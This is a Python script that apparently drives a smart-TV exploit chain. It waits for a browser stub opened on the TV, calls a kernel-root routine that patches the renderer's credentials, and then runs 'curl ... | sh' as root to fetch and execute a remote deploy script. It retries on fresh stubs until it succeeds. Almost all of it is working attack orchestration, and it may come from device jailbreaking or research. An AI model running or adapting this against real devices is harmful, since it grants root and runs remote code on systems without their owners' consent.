"""Wait for the next TV physmap stub, root it, and run the deploy script.

Start this *before* opening the page on the TV: it blocks on the local RPC
gateway (127.0.0.1:9998) until the browser stub connects, then patches the
renderer's cred and fires the deploy script in the same stub lifetime.

Usage:
    python auto_root.py --host <PC-IP> [--script deploy_local.sh] [--wait 150]
                        [--stub-wait 0]

--stub-wait 0 (default) waits forever for a stub; a positive value gives up
after that many seconds.
"""
import argparse
import os
import socket
import struct
import sys
import threading
import time

import kernel_root as kroot
import physmap as T

DEFAULT_HOST = os.environ.get("ROOT_HOST")
DEFAULT_SCRIPT = os.environ.get("ROOT_SCRIPT", "deploy.sh")


def start_heartbeat(url, interval):
    """Remind the human that the TV page still has to be opened."""
    if interval <= 0:
        return None
    stop = threading.Event()

    def beat():
        waited = 0
        while not stop.wait(interval):
            waited += interval
            print(f"[auto] still waiting ({waited}s) - open {url} on the TV",
                  flush=True)

    threading.Thread(target=beat, daemon=True).start()
    return stop


def run(rpc, cmd, wait=120.0):
    buf = b"-c\x00" + cmd.encode()
    if len(buf) > 512:
        raise SystemExit(f"[-] command is {len(buf)} B; the stub's cmdbuf is 512 B "
                         f"(use a short 'curl ... | sh' form)")
    rpc._cmd(7, 0, 0, len(buf))
    rpc.s.sendall(buf)
    pid = struct.unpack("<i", rpc._recv_exact(4))[0]
    print(f"[run] child pid={pid}", flush=True)
    rpc.s.settimeout(5)
    data = b""
    end = time.time() + wait
    while time.time() < end:
        try:
            d = rpc.s.recv(65536)
            if not d:
                break
            data += d
            if b"DEPLOY_DONE" in data:
                break
        except socket.timeout:
            continue
    sys.stdout.write(data.decode("latin-1", "replace"))
    print(f"\n[run] {len(data)} bytes", flush=True)
    return data


def main():
    ap = argparse.ArgumentParser(description="Wait for a TV stub, root it, deploy.")
    ap.add_argument("--host", default=DEFAULT_HOST, help="PC IP as seen by the TV")
    ap.add_argument("--script", default=DEFAULT_SCRIPT,
                    help="deploy script name on the server (default deploy.sh)")
    ap.add_argument("--wait", type=float, default=120.0,
                    help="seconds to wait for deploy output (default 120)")
    ap.add_argument("--stub-wait", type=float, default=0.0,
                    help="seconds to wait for a stub; 0 = forever (default)")
    ap.add_argument("--page", default="index.html",
                    help="page URL to show in the waiting reminders")
    ap.add_argument("--heartbeat", type=float, default=30.0,
                    help="reminder interval while waiting; 0 = off (default 30)")
    ap.add_argument("--root-retries", type=int, default=3,
                    help="total fresh-stub root attempts (default 3; first failure asks for a reload)")
    ap.add_argument("--expect", default="DEPLOY_DONE,COPY=ok",
                    help="comma-separated tokens the deploy output must contain")
    args = ap.parse_args()
    if not args.host:
        print("[-] --host <pc-ip> is required (or set ROOT_HOST)", flush=True)
        return 2
    cmd = f"curl -s http://{args.host}/{args.script} | sh"
    page_url = f"http://{args.host}/{args.page}"

    print(f"[auto] waiting for TV stub on 127.0.0.1:9998 ... (deploy: {args.script})",
          flush=True)
    print(f"[auto] open {page_url} on the TV if you have not already", flush=True)

    attempts = max(1, args.root_retries)
    for attempt in range(1, attempts + 1):
        beat = start_heartbeat(page_url, args.heartbeat)
        try:
            try:
                rpc = T.RPC(timeout=25, hello_timeout=(args.stub_wait or None))
            except TimeoutError as exc:
                print(f"[-] {exc}", flush=True)
                print(f"[-] the TV page was probably not opened: {page_url}", flush=True)
                return 1
            except OSError as exc:
                print(f"[-] cannot reach the RPC gateway on 127.0.0.1:9998: {exc}",
                      flush=True)
                print("[-] is the server running? (server/server.py)", flush=True)
                return 1
        finally:
            if beat:
                beat.set()

        try:
            print(f"[auto] stub paired (root attempt {attempt}/{attempts})", flush=True)
            time.sleep(1.0)          # let the fresh renderer settle
            try:
                ok = kroot.root_via_fork(rpc)
            except Exception as exc:  # a dead stub must not kill the retry loop
                print(f"[-] root error: {type(exc).__name__}: {exc}", flush=True)
                ok = False
            if ok:
                data = run(rpc, cmd, args.wait)
                missing = [t for t in args.expect.split(",") if t and t.encode() not in data]
                if missing:
                    print(f"[-] deploy did not finish correctly; missing: {', '.join(missing)}",
                          flush=True)
                    return 1
                print(f"[auto] deploy verified ({', '.join(args.expect.split(','))})",
                      flush=True)
                return 0
        finally:
            rpc.close()

        if attempt < attempts:
            print("[-] root failed on this stub - the page is single-use.", flush=True)
            print(f"[auto] RELOAD {page_url} on the TV once; waiting for a fresh stub "
                  f"({attempt}/{attempts})", flush=True)
            try:
                T.reset_stub()
            except Exception as exc:
                print(f"[auto] stub reset: {exc}", flush=True)
            time.sleep(1.0)

    print(f"[-] root failed after {attempts} fresh-stub attempts", flush=True)
    return 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except SystemExit:
        raise
    except Exception as exc:                      # keep CLI failures readable
        print(f"[-] {type(exc).__name__}: {exc}", flush=True)
        raise SystemExit(1)
